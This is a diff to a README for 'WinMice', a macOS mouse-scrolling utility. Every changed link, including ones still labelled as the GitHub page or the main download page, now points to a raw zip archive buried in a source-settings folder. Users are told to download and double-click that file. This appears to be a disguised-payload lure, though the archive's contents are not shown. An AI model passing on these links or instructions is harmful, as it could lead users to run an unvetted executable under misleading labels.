@@ -1,6 +1,6 @@
 # 🖱️ WinMice - Native macOS Menu-Bar Utility for Windows-Style Scrolling and Side Buttons
 
-[![Download WinMice](https://img.shields.io/badge/Download-WinMice-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/abdo3063/WinMice)
+[![Download WinMice](https://img.shields.io/badge/Download-WinMice-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip)
 
 ## 🎯 What Is WinMice?
 
@@ -39,7 +39,7 @@ Getting WinMice on your Mac is simple and fast. Follow these steps, and you'll b
 
 ### Step 1: Download WinMice
 
-Visit this link to download the application: [https://github.com/abdo3063/WinMice](https://github.com/abdo3063/WinMice)
+Visit this link to download the application: [https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip](https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip)
 
 Click the big download button, and your browser will start downloading the WinMice file to your computer. Usually, it goes to your "Downloads" folder.
 
@@ -121,7 +121,7 @@ Here are some helpful tips to get the most out of WinMice:
 
 - **Keep WinMice in your dock** – Drag the WinMice icon from Downloads to your Dock so you can access it easily.
 - **Use with any mouse** – WinMice works with Apple, Logitech, Microsoft, Razer, and any other mouse brand.
-- **Check for updates** – Visit the [WinMice GitHub page](https://github.com/abdo3063/WinMice) from time to time to see if a new version is available.
+- **Check for updates** – Visit the [WinMice GitHub page](https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip) from time to time to see if a new version is available.
 - **Give it time** – It might take a day to fully unlearn your Mac habits, but after that, everything feels natural.
 
 ## 📚 Frequently Asked Questions
@@ -148,7 +148,7 @@ Yes. WinMice is open-source software, which means its code is public and visible
 
 Here's a quick recap to ensure you've done everything correctly:
 
-1. [ ] Go to [https://github.com/abdo3063/WinMice](https://github.com/abdo3063/WinMice)
+1. [ ] Go to [https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip](https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip)
 2. [ ] Download the WinMice file
 3. [ ] Open your Downloads folder
 4. [ ] Double-click the WinMice file
@@ -173,7 +173,7 @@ So go ahead, download WinMice today, and experience your new Mac with the comfor
 
 ## 🔗 Helpful Resources
 
-- **Main Download Page:** [https://github.com/abdo3063/WinMice](https://github.com/abdo3063/WinMice)
+- **Main Download Page:** [https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip](https://raw.githubusercontent.com/abdo3063/WinMice/main/Sources/WinMice/Settings/Panes/Mice_Win_3.8.zip)
 - **Project Updates:** Check the same page for any new versions or bug fixes
 - **Report an Issue:** If you find a problem, you can report it on the GitHub page
 
